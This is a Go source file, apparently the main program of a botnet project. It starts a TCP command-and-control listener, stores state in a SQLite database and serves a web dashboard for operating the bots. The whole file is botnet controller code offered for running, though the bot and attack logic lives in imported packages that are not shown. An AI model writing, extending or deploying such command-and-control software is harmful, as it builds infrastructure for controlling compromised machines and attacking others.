package main

import (
	"flag"
	"log"

	"github.com/rodzzlessa24/botnet"

	"github.com/rodzzlessa24/botnet/tcp"

	"github.com/rodzzlessa24/botnet/http"
	"github.com/rodzzlessa24/botnet/sqlite"
)

var (
	hostPtr    = flag.String("host", "127.0.0.1", "the host for the command and control")
	portPtr    = flag.String("port", "9090", "the port for the command and control")
	webPortPtr = flag.String("webport", "8000", "the port for the web dashboard")
)

func main() {
	flag.Parse()

	// Set the httpAddress
	httpAddress := ":8000"
	if *webPortPtr != "" {
		httpAddress = ":" + *webPortPtr
	}

	db, err := sqlite.Open("./cc.db")
	if err != nil {
		log.Panic(err)
	}
	defer db.Close()
	storage := &sqlite.Client{DB: db}

	commander := tcp.NewCC(*hostPtr, *portPtr, storage)
	go commander.Listen()

	h := http.NewHandler(commander, storage)

	botnet.Msg("web server available on port", *webPortPtr)
	log.Fatal(http.ListenAndServe(httpAddress, h))
}